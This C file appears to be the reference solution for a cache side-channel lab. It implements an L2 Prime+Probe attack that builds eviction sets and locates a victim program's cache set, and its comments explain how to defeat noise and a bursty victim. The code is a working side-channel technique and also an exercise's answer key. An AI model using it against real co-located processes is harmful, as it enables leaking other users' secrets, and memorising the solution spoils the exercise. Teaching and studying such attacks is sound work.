/* Part 3 - REFERENCE SOLUTION (spoilers). Find the victim's L2 set with Prime+Probe.
 *
 * Lessons built into the victim:
 *  - With a single forward prime, one eviction anywhere makes the probe cascade (each miss evicts
 *    the next line of our own), so noise looks exactly like the victim. Priming forward and then
 *    backward (see pp_prime) stops the cascade: k victim lines then cost us ~k misses, while
 *    background noise mostly costs 0-1. So count *rounds with >= 3 misses* over many rounds.
 *  - In hard mode the victim is only active in bursts, so look at every set at several different
 *    times (several full passes) before trusting any ranking, then watch the finalists for longer
 *    than one burst period. Shuffle the scan order in every pass: a pass takes an almost constant
 *    time, so a fixed order can visit the victim's set at the same burst phase every time.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "lab.h"

#define MAXW 64

/* Run `reps` prime/wait/probe rounds on one set; return how many rounds lost >= 3 lines. */
static int hot_rounds(uint8_t *const *ev, int n, int reps, const cal_t *cal) {
    int hot = 0;
    for (int r = 0; r < reps; r++) {
        pp_prime(ev, n);
        plat_wait(2500);
        hot += pp_probe(ev, n, cal) >= 3;
    }
    return hot;
}

int pp_find_set(const cal_t *cal, int victim_lines) {
    (void)victim_lines;
    const plat_geom_t *g = plat_geom();
    int sets = g->l2_sets, ways = g->l2_ways;
    if (ways > MAXW) ways = MAXW;
    pool_t pool;
    pool_init(&pool, (size_t)sets * (size_t)g->line * (size_t)ways * 2);
    if (!pool.huge) {
        fprintf(stderr, "pp_find_set: no huge pages, cannot compute set indexes\n");
        return -1;
    }
    uint8_t **ev = malloc(sizeof(uint8_t *) * (size_t)sets * (size_t)ways);
    for (int s = 0; s < sets; s++)
        if (evset_build(&pool, (unsigned)s, ways, ev + (size_t)s * ways) < ways) return -1;

    /* pass 1: PASSES sweeps over all sets in random order, 3 rounds per set per sweep */
    enum { PASSES = 12, MAXC = 64 };
    int *score = calloc((size_t)sets, sizeof(int)), *order = malloc(sizeof(int) * (size_t)sets);
    for (int s = 0; s < sets; s++) order[s] = s;
    for (int p = 0; p < PASSES; p++) {
        for (int i = sets - 1; i > 0; i--) {
            int j = (int)(plat_rand() % (uint64_t)(i + 1)), t = order[i];
            order[i] = order[j];
            order[j] = t;
        }
        for (int i = 0; i < sets; i++) score[order[i]] += hot_rounds(ev + (size_t)order[i] * ways, ways, 3, cal);
    }

    /* pass 2: every set that ever looked hot (best first, at most MAXC, at least 8) is watched for
     * 40 rounds - longer than one burst period - and the busiest one wins */
    int best = -1, bs = -1;
    for (int k = 0; k < MAXC; k++) {
        int b = -1;
        for (int s = 0; s < sets; s++)
            if (score[s] >= 0 && (b < 0 || score[s] > score[b])) b = s;
        if (b < 0 || (score[b] == 0 && k >= 8)) break;
        score[b] = -1; /* mark as visited */
        int sc = hot_rounds(ev + (size_t)b * ways, ways, 40, cal);
        if (sc > bs) { bs = sc; best = b; }
    }
    free(score);
    free(order);
    free(ev);
    return best;
}
